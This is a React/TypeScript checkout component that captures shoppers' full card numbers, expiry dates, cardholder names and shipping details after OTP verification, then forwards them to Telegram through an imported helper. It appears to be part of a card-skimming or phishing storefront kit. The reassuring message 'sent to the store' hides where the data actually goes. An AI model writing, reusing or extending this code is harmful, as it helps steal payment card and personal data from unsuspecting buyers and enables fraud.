import { useState } from 'react';
import PaymentForm from '@/components/payment/PaymentForm';
import { sendCheckoutDataToTelegram } from './telegram-notifier';
import { toast } from '@/hooks/use-toast';

interface ShippingDetails {
  fullName: string;
  phoneNumber: string;
  email: string;
  streetAddress: string;
  city: string;
  stateProvince: string;
  postalCode: string;
  country: string;
}

interface PaymentDetailsData {
  cardholderName: string;
  cardNumber: string;
  cardBrand: string;
  expiryMonth: string;
  expiryYear: string;
}

interface CheckoutFormWithTelegramProps {
  amount: number;
  currency?: string;
  orderId?: string;
  productName?: string;
  quantity?: number;
  shippingDetails: ShippingDetails;
  onSuccess?: (transactionId: string) => void;
  onCancel?: () => void;
  onPaymentDataReady?: (paymentData: PaymentDetailsData) => void;
}

/**
 * Enhanced Payment Form that integrates Telegram notification sending
 * Captures both shipping and payment details and sends them when OTP is verified
 */
export default function CheckoutFormWithTelegram({
  amount,
  currency = 'USD',
  orderId,
  productName,
  quantity,
  shippingDetails,
  onSuccess,
  onCancel,
  onPaymentDataReady,
}: CheckoutFormWithTelegramProps) {
  const [paymentData, setPaymentData] = useState<PaymentDetailsData | null>(null);

  // This callback will be triggered when payment form's OTP verification succeeds
  const handlePaymentSuccess = async (transactionId: string) => {
    try {
      // Send combined checkout data to Telegram when verification is complete
      if (paymentData && shippingDetails) {
        const checkoutDataToSend = {
          shippingDetails,
          paymentDetails: paymentData,
          orderInfo: {
            orderId,
            productName,
            quantity,
            amount,
            currency,
          },
        };

        const success = await sendCheckoutDataToTelegram(checkoutDataToSend);

        if (success) {
          toast({
            title: 'Checkout Notification Sent',
            description: 'Your checkout details have been sent to the store.',
          });
        } else {
          console.error('Failed to send Telegram notification, but payment succeeded');
          // Don't block the user experience even if telegram notification fails
        }
      }

      // Call the original success callback
      onSuccess?.(transactionId);
    } catch (error) {
      console.error('Error in handlePaymentSuccess:', error);
      // Still allow success to proceed even if Telegram fails
      onSuccess?.(transactionId);
    }
  };

  return (
    <PaymentForm
      amount={amount}
      currency={currency}
      orderId={orderId}
      productName={productName}
      quantity={quantity}
      onSuccess={handlePaymentSuccess}
      onCancel={onCancel}
      onPaymentDataCaptured={setPaymentData}
    />
  );
}
